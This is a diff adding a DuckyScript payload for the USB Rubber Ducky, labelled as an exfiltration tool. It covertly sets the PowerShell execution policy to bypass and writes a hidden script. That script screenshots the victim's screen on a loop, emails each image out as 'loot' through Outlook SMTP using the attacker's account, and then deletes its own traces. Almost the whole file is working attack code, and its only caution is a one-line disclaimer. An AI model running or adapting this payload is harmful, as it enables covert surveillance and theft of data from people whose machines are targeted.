@@ -1,0 +1,77 @@
+REM Title: ducky_crab
+REM Author: the-jcksn
+REM Description: Gives "screen crab" like capabilities to the USB rubber ducky. Creates a powershell script that captures screenshots and exfiltrates them via outlook, once a minute, even after the USB rubber ducky has been removed.
+REM Target: Windows
+REM Version: 1.0
+REM Category: Exfiltration
+
+REM ~~~~ You must change USER@EXAMPLE.com and USERPASSWORD to your outlook credentials (line 45)
+REM ~~~~ Change the time for the payload to run after ducky is removed (default 10 minutes - line 38)
+REM ~~~~ DO NOT REMOVE THE RUBBER DUCKY UNTIL THE PROMPT APPEARS ON SCREEN SAYING TO DO SO, after this, the payload will run without the ducky inserted
+REM ~~~~ You might have to adjust the delays, depending on the target machine, but these worked ok for me.
+REM ~~~~ Use responsibly, and within the confines of the law.
+
+
+REM opening powershell and allowing scripts
+DELAY 1000
+REM this needs to run first seperate from the script (allows scripts to run on target)
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 200
+STRING Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
+ENTER
+DELAY 200
+REM the following line may cause an error on some systems, this can be ignored, on some systems it is REQUIRED, please do not alter this
+STRING y
+ENTER
+DELAY 400
+REM create the powershell script
+STRING New-Item -Path 'Pictures' -Name 'screens.ps1' -ItemType file
+ENTER
+DELAY 200
+STRING "cd C:\Users\$env:username\ `nNew-Item -Path 'C:\Users\$env:username\Pictures\Screens\' -ItemType Directory" | Out-File Pictures\screens.ps1 -Append
+ENTER
+DELAY 200
+REM number of minutes to capture screenshots for - default is 10 (edit the integer to change)
+STRING "`$timer = new-timespan -Minutes 10" | Out-File Pictures\screens.ps1 -Append
+ENTER
+DELAY 200
+STRING "`$clock = [diagnostics.stopwatch]::StartNew() `nwhile (`$clock.elapsed -lt `$timer){ `n[void][reflection.assembly]::loadwithpartialname('system.windows.forms') `n`$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen `n`$Width = `$Screen.Width `n`$Height = `$Screen.Height `n`$Left = `$Screen.Left `n`$Top = `$Screen.top `n`$bitmap = New-Object System.Drawing.Bitmap `$Width, `$Height `n`$graphic = [System.Drawing.Graphics]::FromImage(`$bitmap) `n`$graphic.CopyFromScreen(`$Left, `$Top, 0, 0, `$bitmap.Size) `n`$enddate = (Get-Date).tostring('ddMMyy-hh_mm_ss') `n`$filename = `$enddate + '.gif' `n`$bitmap.Save('C:\Users\$env:Username\Pictures\Screens\' + `$filename) `nstart-sleep -seconds 10"  | Out-File Pictures\screens.ps1 -Append
+ENTER
+DELAY 200
+REM change USER@EXAMPLE.COM (3 times) and USERPASSWORD (once) to your credentials below. DO NOT REMOVE ANY QUOTES OR BACKTICKS
+STRING "Send-MailMessage -From USER@EXAMPLE.COM -To USER@EXAMPLE.COM -Subject `"Screenshot loot`" -Body `"Please find attached your screenshot update`" -Attachment `"Pictures\Screens\`$filename`" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList USER@EXAMPLE.COM, (ConvertTo-SecureString -String `"USERPASSWORD`" -AsPlainText -Force))" | Out-File Pictures\screens.ps1 -Append
+ENTER
+DELAY 200
+STRING "start-sleep -seconds 60 `n} `nSet-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser `nGet-ChildItem Pictures\Screens -Include *.* -Recurse | ForEach {`$_.Delete()} `nRemove-Item Pictures\screens -Confirm:`$false `nRemove-Item Pictures\screens.ps1 -Force `nexit" | Out-File Pictures\screens.ps1 -Append
+ENTER
+DELAY 200
+STRING exit
+ENTER
+DELAY 300
+REM run the script we created
+GUI r
+DELAY 300
+STRING powershell -w hidden -File "%USERPROFILE%\Pictures\screens.ps1"
+ENTER
+DELAY 1000
+GUI r
+DELAY 200
+STRING notepad
+ENTER
+DELAY 300
+STRING You may now remove the rubber ducky and close this window. Loot will arrive shortly.
+ENTER
+ENTER
+DELAY 500
+STRING Closing this window automatically in:
+ENTER
+STRING 3...
+ENTER
+DELAY 600
+STRING 2...
+DELAY 600
+ALT F4
+STRING n
